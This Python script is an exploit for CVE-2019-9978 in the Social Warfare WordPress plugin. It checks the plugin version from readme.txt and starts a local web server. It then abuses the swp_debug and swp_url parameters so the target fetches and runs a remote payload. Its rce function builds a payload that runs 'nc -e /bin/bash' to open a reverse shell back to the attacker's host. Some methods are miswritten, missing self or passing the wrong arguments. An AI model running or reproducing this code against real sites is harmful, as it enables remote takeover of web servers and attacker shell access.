import requests 
import re
import  subprocess
import netifaces as ni

class warfare_rce: 
    def __init__(self, url): 
        self.url = url
    def create_server(): 
        process = subprocess.Popen(['python', "-m", "SimpleHTTPServer", "65534"], stdout=subprocess.PIPE)
        return process
    def get_ip_address(): 
        ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
        return ip
    def check_version(self): 
        url  = self.url + "/wp-content/plugins/social-warfare/readme.txt"
        resp = requests.get(url, verify=False)
        fixed_version = "3.5.3" 
        try: 
            match = re.findall(
                r'== Changelog ==\n\n= ([0-9]+\.[0-9]+\.[0-9])',
                str(resp.text)
            )
            if(match[0]) < fixed_version: 
                return True
            else: 
                return False
        except: return False
    def exploit(self): 
        if self.check_version(self.url): 
            server = self.create_server()
            ip_server = self.get_ip_address()
            r = requests.get(self.url + "/wp-admin/admin-post.php?rce=id&swp_debug=load_options&swp_url=http://" + ip_server + ":65534/cve-2019-9978-attack.txt")
            if("test cve-2019-9978 successfully!!!" in r.text): 
                server.terminate()
                return True
            else: 
                server.terminate()
                return False

def verify(url): 
    result = warfare_rce(url)
    return result.check_version()

def exploit(url): 
    result = warfare_rce(url)
    return result.exploit()

def rce(shell_url, lhost, lport): 
    shell = '''<pre>
    system('nc -e /bin/bash {} {}');
    </pre>'''.format(lhost, lport)
    temp = warfare_rce(shell_url)
    check_data = temp.create_server()
    ip_server = temp.get_ip_address()
    with open("cve-2019-9978-shell.txt", "wb") as file:
        file.write( str.encode(shell))
        file.close()
    requests.get(shell_url + "/wp-admin/admin-post.php?rce=id&swp_debug=load_options&swp_url=http://" + ip_server + ":65534/cve-2019-9978-shell.txt", timeout=5)
    return True